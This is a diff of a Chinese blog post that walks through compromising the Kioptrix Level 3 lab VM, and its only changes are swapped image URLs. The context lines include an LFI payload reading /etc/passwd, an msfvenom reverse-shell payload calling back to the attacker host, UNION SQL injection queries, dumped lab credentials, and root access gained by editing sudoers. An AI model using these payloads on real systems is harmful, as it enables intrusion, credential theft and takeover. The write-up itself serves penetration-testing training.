@@ -10,20 +10,20 @@
 <li>OS details: Linux 2.6.9 - 2.6.33</li>
 </ul>
 <p>80端口可以看出cms为<code>Lotus CMS</code>。</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_4.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_4.png" alt=""></p>
 <p>用<code>dirb</code>扫描一下网站目录。也可以用御剑扫描目录。发现存在<code>phpdamin</code></p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_5.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_5.png" alt=""></p>
 <p>cms后台<code>http://192.168.43.158/index.php?system=Admin</code></p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_6.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_6.png" alt=""></p>
 <h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="文件包含-amp-后台上传"><a href="#文件包含-amp-后台上传" class="headerlink" title="文件包含&amp;后台上传"></a>文件包含&amp;后台上传</h3><p>访问80端口上的WEB服务。</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_1.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_1.png" alt=""></p>
 <p>发现url中有点问题</p>
 <p><code>http://192.168.43.158/index.php?system=Blog</code></p>
 <p>尝试<code>system=../../../../../etc/passwd</code></p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_2.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_2.png" alt=""></p>
 <p>好像不行，尝试<code>%00.</code>截断，发现可以读到<code>/etc/passwd</code></p>
 <p><code>http://192.168.43.158/index.php?system=../../../../../../../../etc/passwd%00.</code></p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_3.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_3.png" alt=""></p>
 <p>这里可以结合后面SQLmap跑出来的后台密码得到了一个shell。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.43.177 LPORT=443 -f raw &gt; /tmp/evil.jpg</span><br><span class="line">No platform was selected, choosing Msf::Module::Platform::PHP from the payload</span><br><span class="line">No Arch selected, selecting Arch: php from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 1114 bytes</span><br></pre></td></tr></table></figure>
 <p>用<code>msfvenom</code>生成一个图片马</p>
@@ -40,13 +40,13 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.43.158  kioptrix3.com</span><br></pre></td></tr></table></figure>
 <p><code>service networking restart</code>重启服务</p>
 <p>发现url存在SQL注入。<code>kioptrix3.com/gallery/gallery.php?id=1&amp;sort=photoid#photos</code></p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_7.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_7.png" alt=""></p>
 <p>先用<code>sqlmap</code>进行注入测试，id存在报错注入。</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_8.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_8.png" alt=""></p>
 <p>尝试查找下后台管理员账号密码。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Database: gallery                                                                              </span><br><span class="line">Table: dev_accounts</span><br><span class="line">[2 entries]</span><br><span class="line">+----+------------+---------------------------------------------+</span><br><span class="line">| id | username   | password                                    |</span><br><span class="line">+----+------------+---------------------------------------------+</span><br><span class="line">| 1  | dreg       | 0d3eccfb887aabd50f243b3f155c0f85 (Mast3r)   |</span><br><span class="line">| 2  | loneferret | 5badcaf789d3d1d09794d8f021f40f0e (starwars) |</span><br><span class="line">+----+------------+---------------------------------------------+</span><br></pre></td></tr></table></figure>
 <p>得到管理员账号密码，但是在</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_6.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_6.png" alt=""></p>
 <p>无法登录，另外找到一个登录的地方<code>http://kioptrix3.com/gallery/gadmin/</code></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Database: gallery</span><br><span class="line">Table: gallarific_users</span><br><span class="line">[2 entries]</span><br><span class="line">+----------+----------+</span><br><span class="line">| username | password |</span><br><span class="line">+----------+----------+</span><br><span class="line">| admin    | n0t7t1k4 |</span><br><span class="line">+----------+----------+</span><br></pre></td></tr></table></figure>
 <p>但是可以登录。</p>
@@ -54,16 +54,16 @@
 <h3 id="手注sqli"><a href="#手注sqli" class="headerlink" title="手注sqli"></a>手注sqli</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,2,3,4,5,6#</span><br></pre></td></tr></table></figure>
 <p>判断一共有6列</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,version(),database(),4,5,6#</span><br></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_9.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_9.png" alt=""></p>
 <p>得到当前数据库和版本号</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,group_concat(table_name),3,4,5,6%20from%20information_schema.tables%20where%20table_schema%20=%20database()#</span><br></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_10.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_10.png" alt=""></p>
 <p>得到当前数据库所有的表名。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,group_concat(column_name),3,4,5,6%20FROM%20information_schema.columns%20WHERE%20table_name%20=0x6465765f6163636f756e7473#</span><br></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_11.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_11.png" alt=""></p>
 <p>获取表里的列名。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://kioptrix3.com/gallery/gallery.php?id=1%20union%20select%201,group_concat(username,0x3a,password),3,4,5,6%20FROM%20dev_accounts#</span><br></pre></td></tr></table></figure>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_12.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_12.png" alt=""></p>
 <h3 id="Lotus-CMS-漏洞"><a href="#Lotus-CMS-漏洞" class="headerlink" title="Lotus CMS 漏洞"></a>Lotus CMS 漏洞</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# searchsploit Lotus CMS</span><br><span class="line">------------------------------------------------------- ----------------------------------------</span><br><span class="line"> Exploit Title                                         |  Path</span><br><span class="line">                                                       | (/usr/share/exploitdb/)</span><br><span class="line">------------------------------------------------------- ----------------------------------------</span><br><span class="line">Lotus CMS Fraise 3.0 - Local File Inclusion / Remote C | exploits/php/webapps/15964.py</span><br><span class="line">Lotus Core CMS 1.0.1 - Remote File Inclusion           | exploits/php/webapps/5866.txt</span><br><span class="line">LotusCMS 3.0 - &apos;eval()&apos; Remote Command Execution (Meta | exploits/php/remote/18565.rb</span><br><span class="line">LotusCMS 3.0.3 - Multiple Vulnerabilities              | exploits/php/webapps/16982.txt</span><br><span class="line">------------------------------------------------------- ----------------------------------------</span><br><span class="line">Shellcodes: No Result</span><br></pre></td></tr></table></figure>
 <p>从查询结果看，有一个本地文件包含和一个远程代码执行，</p>
 <p>这里的本地文件包含就是我们之前发现的那个。我们尝试下这个本地文件包含漏洞</p>
@@ -92,10 +92,10 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo ht</span><br><span class="line">Error opening terminal: xterm-256color.</span><br></pre></td></tr></table></figure>
 <p>报错不能打开一个<code>xterm-256color.</code>终端。</p>
 <p>回到本地环境用<code>xshell</code>连接是可以打开的</p>
-<p><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_13.png" alt=""></p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_13.png" alt=""></p>
 <p>此时按<code>F3</code>，可以输入<code>/etc/passwd</code>或者<code>/etc/sudoers</code>文件来进行文件编辑</p>
-<p>把/etc/passwd当前用户的权限修改和<code>root</code>一样即可。<br><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_14.png" alt=""></p>
-<p>也可以把/etc/sudoers当前用户的权限修改和<code>root</code>一样即可。<br><img src="http://obr4sfdq7.bkt.clouddn.com/kioptrix_3_15.png" alt=""></p>
+<p>把/etc/passwd当前用户的权限修改和<code>root</code>一样即可。<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_14.png" alt=""></p>
+<p>也可以把/etc/sudoers当前用户的权限修改和<code>root</code>一样即可。<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/kioptrix_3_15.png" alt=""></p>
 <p>重新登录SSH。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ssh loneferret@192.168.43.158</span><br><span class="line">loneferret@192.168.43.158&apos;s password: </span><br><span class="line">Last login: Tue May  8 19:27:01 2018 from uknow-pc</span><br><span class="line">Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686</span><br><span class="line"></span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">To access official Ubuntu documentation, please visit:</span><br><span class="line">http://help.ubuntu.com/</span><br><span class="line">root@Kioptrix3:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),100(users)</span><br><span class="line">root@Kioptrix3:~# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
 <p>此时已经是<code>root</code>权限了。</p>
